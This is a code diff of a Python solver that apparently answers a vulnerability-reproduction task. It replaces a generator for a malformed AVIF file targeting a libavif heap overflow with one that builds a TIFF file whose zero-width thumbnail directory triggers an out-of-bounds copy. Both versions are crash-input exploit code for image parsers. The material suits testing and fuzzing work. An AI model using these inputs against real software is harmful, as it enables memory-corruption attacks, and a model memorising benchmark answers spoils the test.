@@ -3,98 +3,79 @@ import struct
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generates a PoC for a heap buffer overflow in libavif (oss-fuzz:42536646).
+        Generates a Proof-of-Concept (PoC) for a heap buffer overflow
+        in a TIFF/CR2 image parser.
 
-        The vulnerability is triggered by an AVIF file with an image width or height of 0.
-        The libavif code fails to validate image dimensions, leading to a
-        zero-sized or small allocation for image planes. When the decoder then tries
-        to write image data from the 'mdat' box into these planes, a heap buffer
-        overflow occurs.
-
-        This PoC constructs a minimal but structurally valid AVIF file with the
-        following key features:
-        1. An 'ispe' (Image Spatial Extent) box specifying width=0 and height=1.
-        2. An 'mdat' (Media Data) box containing arbitrary data. The presence
-           of this data ensures that a write operation is attempted on the
-           incorrectly-sized buffer, triggering the overflow. A size of a few
-           kilobytes is chosen to ensure a significant overflow that is easily
-           detected by AddressSanitizer.
+        The vulnerability is triggered by an image with a width or height of zero.
+        This PoC constructs a minimal TIFF file with a thumbnail sub-directory (IFD)
+        that has its ImageWidth tag set to 0. When the parser tries to allocate
+        memory for this thumbnail, it calculates a size of 0 bytes but then
+        proceeds to copy thumbnail data into this buffer, causing an overflow.
         """
 
-        def box(box_type: bytes, content: bytes) -> bytes:
-            """Creates a standard ISOBMFF box."""
-            return struct.pack('>I', len(content) + 8) + box_type + content
+        def create_entry(tag: int, type: int, count: int, value: int) -> bytes:
+            # TIFF directory entries are 12 bytes long, little-endian.
+            # <H (Tag), H (Type), I (Count), I (Value/Offset)
+            return struct.pack('<HHII', tag, type, count, value)
 
-        def full_box(box_type: bytes, version: int, flags: int, content: bytes) -> bytes:
-            """Creates an ISOBMFF full box (with version and flags)."""
-            header = struct.pack('B', version) + struct.pack('>I', flags)[1:]
-            return box(box_type, header + content)
+        # TIFF/Exif constants
+        TIFF_TYPE_SHORT = 3
+        TIFF_TYPE_LONG = 4
 
-        # ---- File Type Box ('ftyp') ----
-        ftyp_box = box(b'ftyp', b'avif\x00\x00\x00\x00avifmif1')
+        TAG_ImageWidth = 0x0100
+        TAG_ImageLength = 0x0101
+        TAG_Compression = 0x0103
+        TAG_SubIFDs = 0x014a
+        TAG_JPEGInterchangeFormat = 0x0201
+        TAG_JPEGInterchangeFormatLength = 0x0202
 
-        # ---- Media Data Box ('mdat') ----
-        # Contains data that will overflow the buffer. 4KB is sufficient.
-        mdat_content = b'\x41' * 4096
-        mdat_box = box(b'mdat', mdat_content)
+        poc_parts = []
 
-        # ---- Meta Box ('meta') and its contents ----
+        # 1. TIFF Header (8 bytes)
+        # 'II' for little-endian, 42 as magic number, followed by offset to the first IFD.
+        offset_ifd0 = 8
+        header = b'II\x2a\x00' + struct.pack('<I', offset_ifd0)
+        poc_parts.append(header)
 
-        # Handler Reference Box ('hdlr')
-        hdlr_content = b'\x00\x00\x00\x00' + b'pict' + b'\x00' * 12 + b'PoC\x00'
-        hdlr_box = full_box(b'hdlr', 0, 0, hdlr_content)
-
-        # Primary Item Reference Box ('pitm')
-        pitm_box = full_box(b'pitm', 0, 0, struct.pack('>H', 1))
-
-        # Item Info Box ('iinf') with one Item Info Entry ('infe')
-        infe_content = struct.pack('>H', 1) + b'\x00\x00' + b'av01' + b'frame\x00'
-        infe_box = full_box(b'infe', 2, 0, infe_content)
-        iinf_box = full_box(b'iinf', 0, 0, struct.pack('>H', 1) + infe_box)
-
-        # Item Properties Box ('iprp')
-        #   Image Spatial Extent ('ispe') - THE VULNERABLE PART (width=0)
-        ispe_box = full_box(b'ispe', 0, 0, struct.pack('>II', 0, 1))
-        #   AV1 Configuration Box ('av1C')
-        av1c_box = box(b'av1C', b'\x81\x0a\x0c\x00')
-        #   Item Property Container ('ipco')
-        ipco_box = box(b'ipco', ispe_box + av1c_box)
-        #   Item Property Association ('ipma')
-        ipma_content = (
-            struct.pack('>I', 1) +      # entry_count
-            struct.pack('>H', 1) +      # item_ID
-            struct.pack('B', 2) +       # association_count
-            struct.pack('B', 0x81) +    # property_index 1 (ispe), essential
-            struct.pack('B', 0x82)      # property_index 2 (av1C), essential
-        )
-        ipma_box = full_box(b'ipma', 0, 0, ipma_content)
-        iprp_box = box(b'iprp', ipco_box + ipma_box)
-
-        # Item Location Box ('iloc')
-        # Must be built after other boxes to calculate data offsets.
-        # First, calculate the final size of the meta box.
-        meta_content_without_iloc = hdlr_box + pitm_box + iinf_box + iprp_box
-        # Our iloc box has a fixed size: content(20 bytes) + header(12 bytes) = 32 bytes
-        iloc_box_size = 32
-        meta_box_size = len(meta_content_without_iloc) + iloc_box_size + 12
-
-        mdat_data_offset = len(ftyp_box) + meta_box_size + 8  # +8 for mdat box header
-        mdat_data_length = len(mdat_content)
-
-        # Now, construct the final 'iloc' box with correct offsets.
-        # v0, offset_size=4, length_size=4, base_offset_size=0
-        iloc_content = (
-            struct.pack('>BB', 0x44, 0x00) +              # sizes
-            struct.pack('>H', 1) +                       # item_count
-            struct.pack('>HHHH', 1, 0, 0, 1) +           # item (id, method, ref_idx, extent_count)
-            struct.pack('>II', mdat_data_offset, mdat_data_length) # extent
-        )
-        iloc_box = full_box(b'iloc', 0, 0, iloc_content)
-
-        # Assemble the final 'meta' box.
-        meta_content = hdlr_box + pitm_box + iinf_box + iloc_box + iprp_box
-        meta_box = full_box(b'meta', 0, 0, meta_content)
+        # 2. IFD0 (Main Image File Directory)
+        # This IFD contains a single entry, a SubIFDs tag, pointing to the thumbnail IFD.
+        num_ifd0_entries = 1
+        # The next block (IFD1) will be placed right after this one.
+        # IFD size = 2 (entry count) + N*12 (entries) + 4 (next IFD offset)
+        offset_ifd1 = offset_ifd0 + 2 + (num_ifd0_entries * 12) + 4
         
-        # Assemble the final PoC file.
-        poc = ftyp_box + meta_box + mdat_box
-        return poc
+        ifd0_entry = create_entry(TAG_SubIFDs, TIFF_TYPE_LONG, 1, offset_ifd1)
+        ifd0 = struct.pack('<H', num_ifd0_entries) + ifd0_entry + struct.pack('<I', 0) # 0 for next IFD offset
+        poc_parts.append(ifd0)
+
+        # 3. IFD1 (Thumbnail Image File Directory)
+        # This is the malicious IFD that will trigger the vulnerability.
+        num_ifd1_entries = 5
+        
+        # The dummy JPEG data will be placed right after this IFD.
+        len_jpeg_data = 32
+        offset_jpeg_data = offset_ifd1 + 2 + (num_ifd1_entries * 12) + 4
+
+        ifd1_entries = [
+            # Entry 1: ImageWidth = 0. This is the core of the vulnerability.
+            create_entry(TAG_ImageWidth, TIFF_TYPE_SHORT, 1, 0),
+            # Entry 2: ImageLength = 10 (a non-zero value).
+            create_entry(TAG_ImageLength, TIFF_TYPE_SHORT, 1, 10),
+            # Entry 3: Compression = 6 (JPEG). This directs the parser to use the thumbnail logic.
+            create_entry(TAG_Compression, TIFF_TYPE_SHORT, 1, 6),
+            # Entry 4: JPEGInterchangeFormat points to the location of the thumbnail data.
+            create_entry(TAG_JPEGInterchangeFormat, TIFF_TYPE_LONG, 1, offset_jpeg_data),
+            # Entry 5: JPEGInterchangeFormatLength specifies the size of the thumbnail data.
+            create_entry(TAG_JPEGInterchangeFormatLength, TIFF_TYPE_LONG, 1, len_jpeg_data)
+        ]
+
+        ifd1 = struct.pack('<H', num_ifd1_entries) + b''.join(ifd1_entries) + struct.pack('<I', 0)
+        poc_parts.append(ifd1)
+
+        # 4. Dummy JPEG Data
+        # This is the data that will be written out of bounds.
+        jpeg_data = b'A' * len_jpeg_data
+        poc_parts.append(jpeg_data)
+
+        # Concatenate all parts to form the final PoC file.
+        return b''.join(poc_parts)
